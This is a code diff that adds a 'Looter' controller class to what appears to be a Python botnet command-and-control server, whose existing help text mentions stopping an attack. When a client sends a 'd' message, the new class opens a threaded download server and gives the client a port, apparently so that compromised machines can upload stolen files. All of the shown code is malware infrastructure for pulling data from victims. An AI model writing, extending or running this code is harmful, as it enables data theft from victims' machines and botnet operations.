@@ -245,3 +245,21 @@ class BasicBotControler(BasicControler):
         hilfe += "-- ss stp                    - Send signal to stop attack\n"
 
         return self.hilfe() + hilfe
+
+
+class LooterControler(BasicControler):
+    def __init__(self, pipe : Pipe, server_callback: object):
+        super().__init__(pipe, server_callback)
+        self.name = "GypsyKing Controler"
+
+    def setCoordinates(self, fname: str, flen: str, handler: object) -> None:
+        xtra = self.server.__xtraServ(self.server, flen, fname)
+        self.server.Tasker.addTask(name="Looter Downloader", func_name=xtra.START, info="Download file threading", types="handlers")
+        handler.sendMsg(f"1 {str(xtra.port)}")
+    
+    def sysCMD(self, cmd: list, handler: object) -> None:
+        match cmd[0]:
+            case "d":
+                self.setCoordinates(cmd[1], cmd[2], handler)
+            case _:
+                self.server.Msg(f"[!!] WARNING ! Client id={handler.ID} addr: {handler.Addr} send unknown system message or try spoof you [!!]")
